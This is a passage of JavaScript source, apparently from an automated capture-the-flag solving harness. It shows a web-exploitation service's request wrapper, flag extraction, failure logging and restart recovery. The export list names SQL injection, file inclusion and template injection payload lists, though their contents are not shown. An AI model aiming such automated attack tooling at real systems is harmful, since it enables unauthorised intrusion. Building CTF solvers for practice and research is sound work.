	/** 发请求（统一超时/错误包装）。 */
	async _request(planId, task, url) {
		await this._checkCancel(planId, task.id);
		try {
			return await httpRequest(url, {
				timeoutMs: this.config.timeoutMs,
				maxRedirects: this.config.maxRedirects,
				maxResponseBytes: this.config.maxResponseBytes,
				userAgent: this.config.userAgent
			});
		} catch (error) {
			throw error;
		}
	}

	/** 工具回显 → tool_outputs/<planId>:<taskId>。 */
	async _tool(planId, taskId, line) {
		await this.blackboard.append("tool_outputs", `${planId}:${taskId}`, { output: line, source: "web-expert", at: nowIso() });
	}

	/** 中间线索 → clues/<planId>:<taskId>:notes。 */
	async _clue(planId, taskId, text) {
		await this.blackboard.append("clues", `${planId}:${taskId}:notes`, { clue: text, source: "web-expert", at: nowIso() });
	}

	/** 从响应文本提取候选 flag → candidate_flags（经 planner.submitFlag，verifier 会自动校验）。 */
	async _extractFlags(planId, taskId, text) {
		if (typeof text !== "string") return;
		const matches = [...new Set((text.match(FLAG_EXTRACTION_RE) ?? []).map((m) => m.trim()))];
		for (const flag of matches) {
			try {
				await this.planner.submitFlag(planId, flag, "web-expert", taskId);
			} catch (error) {
				this.ctx.logger.warn("webExpert: submitFlag %s failed: %s", flag, error?.message);
			}
		}
	}

	/** 单请求网络错误：写入 failures 并继续（非致命）；CANCELLED 必须向上传播中止任务。 */
	async _requestError(planId, task, stage, what, error) {
		if (error?.code === "CANCELLED") throw error;
		const message = `${stage} ${what}: ${error?.message ?? String(error)}`;
		this.ctx.logger.warn("webExpert: %s", message);
		await this._tool(planId, task.id, `[err] ${message}`);
		await this.blackboard.append("failures", `${planId}:${task.id}`, {
			planId, taskId: task.id, type: "web-expert-request", stage, url: error?.url, code: error?.code, message, at: nowIso()
		});
	}

	/** 任务级失败：failures 记录 + planner.failTask + task-fail 事件。 */
	async _handleTaskError(planId, task, phase, error, challenge) {
		const code = error?.code ?? "ERR";
		const message = error?.message ?? String(error);
		await this._tool(planId, task.id, `[fail] ${message}`);
		await this.blackboard.append("failures", `${planId}:${task.id}`, {
			planId, taskId: task.id, type: "web-expert-error", phase, code, message, url: error?.url ?? extractTargetUrl(challenge ?? {}), at: nowIso()
		});
		await this._setTaskState(planId, task.id, { status: "failed", progress: "failed", updatedAt: nowIso(), error: { code, message } });
		try {
			await this.planner.failTask(planId, task.id, `${code}: ${message}`, { executor: "web-expert", phase });
		} catch (failErr) {
			this.ctx.logger.debug("webExpert: planner failTask skipped for %s/%s: %s", planId, task.id, failErr?.message);
		}
		if (!this.closed) this.ctx.emit("web-expert/task-fail", { planId, taskId: task.id, phase, error: { code, message }, reason: code, at: nowIso() });
		return { phase, status: "failed", error: { code, message }, at: nowIso() };
	}

	/** 任务状态写入 webExpert/tasks/<planId>:<taskId>。 */
	async _setTaskState(planId, taskId, patch) {
		const key = this._taskKey(planId, taskId);
		const current = await this.blackboard.get(this.section, key);
		await this.blackboard.set(this.section, key, { ...(current ?? { planId, taskId }), ...patch, updatedAt: nowIso() });
	}

	/** 步骤边界检查取消标志。 */
	async _checkCancel(planId, taskId) {
		if (this.runningLocal.get(this._taskKey(planId, taskId)) === true) {
			throw Object.assign(new Error("任务被取消"), { code: "CANCELLED" });
		}
	}

	_emitProgress(planId, task, detail) {
		if (this.closed) return;
		this.ctx.emit("web-expert/task-progress", { planId, taskId: task.id, phase: task.phase, step: detail, at: nowIso() });
	}

	_taskKey(planId, taskId) {
		return `tasks/${planId}:${taskId}`;
	}

	_handleError(context, error) {
		this.ctx.logger.error("webExpert: %s failed: %s", context, error?.message ?? String(error));
		if (!this.closed) this.ctx.emit("web-expert/error", { context, error, at: nowIso() });
	}

	//#endregion

	//#region 重启断点恢复

	/**
	 * 启动扫描恢复：
	 * 1) 遍历 planner 计划中 category=web 且任务状态 running 的子任务；
	 * 2) 兜底扫描 webExpert/tasks 中 status=running 的记录（如计划已丢失或
	 *    任务由手动 executeTask 派发）。
	 * 两类任务：本插件曾认领（webExpert/tasks 记录 running）→ 标记 interrupt
	 * （写入 failures，type=web-expert-interrupt）并重新调度执行；未认领的
	 * running 任务直接接管（autoClaim 时）。
	 */
	async _resumeInterrupted() {
		const handled = new Set();
		let resumed = 0;
		const resumeTask = async (planId, task, challenge) => {
			if (this.closed) return;
			handled.add(`${planId}:${task.id}`);
			const state = await this.getTaskState(planId, task.id);
			if (state?.status === "running") {
				await this._setTaskState(planId, task.id, { status: "interrupted", progress: "interrupted", updatedAt: nowIso() });
				await this.blackboard.append("failures", `${planId}:${task.id}`, {
					planId, taskId: task.id, type: "web-expert-interrupt", phase: task.phase, message: "harness 重启，web 子任务执行被中断；重新调度", at: nowIso()
				});
				this.ctx.logger.warn("webExpert: 恢复计划 %s 任务 %s（interrupt → 重调度）", planId, task.id);
			}
			await this.executeTask({ planId, task, challenge }).catch((error) => {
				this._handleError(`resume ${planId}/${task.id}`, error);
			});
			resumed += 1;
		};

		// 1) planner 计划扫描
		const plans = await this.planner.listPlans();
		for (const plan of plans) {
			if (plan.category !== "web" || plan.status !== "running") continue;
			for (const task of plan.tasks) {
				if (task.status !== "running") continue;
				const phase = String(task.phase ?? "").toLowerCase();
				if (!WEB_TASK_PHASES.includes(phase)) continue;
				const challenge = await this.blackboard.get("challenges", plan.planId);
				await resumeTask(plan.planId, task, challenge ?? { description: plan.description, attachments: plan.attachments });
			}
		}

		// 2) webExpert/tasks 兜底（计划不存在 / 手动派发场景）
		const states = await this.listTasks();
		for (const st of states) {
			if (st.status !== "running") continue;
			if (handled.has(`${st.planId}:${st.taskId}`)) continue;
			const challenge = await this.blackboard.get("challenges", st.planId);
			await resumeTask(st.planId, { id: st.taskId, phase: st.phase, title: st.title ?? st.phase, description: "" }, challenge);
		}

		if (resumed > 0) this.ctx.logger.info("webExpert: 重启恢复完成，重新调度 %d 个 web 子任务", resumed);
	}

	//#endregion
}

export {
	BODY_FINGERPRINTS,
	COOKIE_FINGERPRINTS,
	DIR_DICTIONARY,
	FLAG_EXTRACTION_RE,
	HEADER_FINGERPRINTS,
	LEAK_PATHS,
	LFI_PAYLOADS,
	SQL_ERROR_SIGNATURES,
	SQLI_PAYLOADS,
	SSTI_PAYLOADS,
	WEB_TASK_PHASES,
	WebExpertService,
	WebExpertService as default,
	extractTargetUrl,
	httpRequest
};
//#endregion
